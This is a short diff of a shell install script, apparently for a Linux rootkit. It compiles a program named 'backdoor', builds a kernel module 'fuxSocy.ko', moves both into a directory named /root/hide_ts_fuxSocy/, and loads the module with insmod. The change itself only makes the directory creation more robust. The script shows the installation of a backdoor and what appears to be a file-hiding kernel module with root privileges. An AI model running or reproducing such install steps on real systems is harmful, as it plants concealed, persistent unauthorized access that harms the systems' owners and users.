@@ -1,8 +1,13 @@
 gcc backdoor.c -o backdoor
 make
-#mkdir /root/hide_ts_fuxSocy/
-mv fuxSocy.ko /root/hide_ts_fuxSocy/
-mv backdoor /root/hide_ts_fuxSocy/
+DIR="/root/hide_ts_fuxSocy/"
+
+if [ ! -d "$DIR" ]; then
+    mkdir -p "$DIR"
+fi
+
+mv fuxSocy.ko $DIR
+mv backdoor $DIR
 
 insmod /root/hide_ts_fuxSocy/fuxSocy.ko
 
